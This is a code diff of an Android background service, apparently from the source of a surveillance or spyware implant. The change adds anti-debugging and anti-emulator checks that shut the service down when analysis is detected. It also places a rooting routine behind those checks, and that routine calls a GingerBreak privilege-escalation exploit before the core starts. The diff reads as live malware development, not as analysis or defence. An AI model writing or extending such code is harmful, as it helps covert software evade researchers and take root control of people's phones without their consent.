@@ -18,7 +18,7 @@ public class ServiceMain extends Service {
 	private static final String TAG = "ServiceCore"; //$NON-NLS-1$
 	private boolean needsNotification = false;
 	private Core core;
-	  
+
 	@Override
 	public IBinder onBind(Intent intent) {
 		return null;
@@ -27,14 +27,18 @@ public class ServiceMain extends Service {
 	@Override
 	public void onCreate() {
 		super.onCreate();
-		
+
 		Status.setAppContext(getApplicationContext());
-		if( ! Core.check() ){
+		// ANTIDEBUG ANTIEMU
+		if (!Core.checkStatic()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onCreate) anti emu/debug failed");
+			}
 			return;
 		}
-		
+
 		Messages.init(getApplicationContext());
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
 		}
@@ -42,9 +46,9 @@ public class ServiceMain extends Service {
 		if (Cfg.DEMO) {
 			Toast.makeText(this, Messages.getString("32_1"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
-		
-		//TODO: verificare che needsNotification serva.
-		needsNotification = false; //Root.isNotificationNeeded();		
+
+		// TODO: verificare che needsNotification serva.
+		needsNotification = false; // Root.isNotificationNeeded();
 
 		// E' sempre false se Cfg.ACTIVITY = false
 		if (needsNotification == true) {
@@ -68,23 +72,27 @@ public class ServiceMain extends Service {
 	@Override
 	public void onStart(Intent intent, int startId) {
 		super.onStart(intent, startId);
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onStart)"); //$NON-NLS-1$
 		}
-		
-		if( ! Core.check() ){
-			return;
+
+		// ANTIDEBUG ANTIEMU
+		if (Core.checkStatic()) {
+
+			Root root = new Root();
+			root.getPermissions();
+
+			if (Cfg.EXP) {
+				root.runGingerBreak();
+			}
+
+		}else{
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onStart) anti emu/debug failed");
+			}
 		}
-
-		Root root=new Root();
-		root.getPermissions();
-
-		if (Cfg.EXP) {
-			root.runGingerBreak();
-		}
-
-		// Core starts	
+		// Core starts
 		core = Core.self();
 		core.Start(this.getResources(), getContentResolver());
 	}
